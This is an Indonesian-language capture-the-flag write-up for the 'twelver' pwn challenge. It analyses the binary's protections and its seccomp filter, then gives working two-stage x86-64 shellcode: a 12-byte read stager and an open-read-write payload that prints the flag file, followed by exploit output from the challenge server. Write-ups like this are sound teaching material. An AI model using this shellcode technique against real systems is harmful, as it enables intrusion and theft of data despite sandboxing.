# twelver


## Analisa


Seperti biasa, kita akan cek konfigurasi program:
```
$ file twelver; checksec twelver
twelver: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1a304064de9d2f46a004a6001ae4080b914329e2, not stripped
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/twelver/twelver'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Program hanya kurang canary. Program memperbolehkan eksekusi 12 byte shellcode di area rwx, **setelah**:
1. Seccomp diaktifkan
2. Semua register dinullkan kecuali `rip`.


Seccomp rules:
```
$ seccomp-tools dump ./twelver
Shellcode > wtf ?
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```
Pada dasarnya, seccomp membuat limitasi syscall di level kernel; rules ini hanya memperbolehkan syscall 64-bit **open**, **read**, **write**, **exit**, dan **exit_group**.


## Eksploitasi


Limitasi seccomp dan register membuat eksploitasi menjadi *sedikit lebih* rumit. Mari kita lihat snippet disassembly program:
```
00000000000009a0 <deregister_tm_clones>:
 9a0:	48 8d 3d 69 16 20 00 	lea    rdi,[rip+0x201669]        # 202010 <__TMC_END__>
 ...
```



Program 64-bit memiliki instruksi seperti ini agar dapat mengambil nilai atau pointer dari global variable. Kita akan memasukkan instruksi `lea register, [rip+offset]` ini ke dalam shellcode kita. Berikut shellcodenya:
```
lea rsi, [rip-0x1]
mov dl, 0x7f
syscall
```


Dan kita masih memiliki 1 byte tersisa. Shellcode ini melakukan syscall **read** dengan buffer shellcode kita sebanyak 127 bytes. Kita dapat mengoverwrite instruksi shellcode di atas dengan nopsled, set register `rsp` dengan region shellcode kita, dan melakukan Open Read Write (ORW) untuk mengeluarkan flag. Berikut shellcode untuk stage 2:
```
lea rsp, [rip+0x800]
		
push 0x1010101 ^ 0x6761
xor dword ptr [rsp], 0x1010101
mov rax, 0x6c662f7265766c65
push rax
mov rax, 0x77742f656d6f682f
push rax

mov rdi, rsp
xor edx, edx
xor esi, esi
xor eax, eax
mov al, 2 ; open("/home/twelver/flag",O_RDONLY)
syscall

xchg rax, rdi
mov rsi, rsp
mov dl, 0x70
xor eax, eax ; read(fd,&rsp,0x70)
syscall

xchg rax, rdx
mov rdi, 1
push rdi
pop rax ; write(1,&rsp,read_return_value)
syscall

mov al, 0x3c ; exit(0)
xor edi, edi
syscall
```


Output script:
```
$ python exploit.py go
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/twelver/twelver'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 128.199.101.63 on port 11114: Done
[*] Switching to interactive mode
CCC{L3a_r1p_push_PoP_sy5C4lL_0rW}
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to 128.199.101.63 port 11114
[*] Got EOF while sending in interactive

```
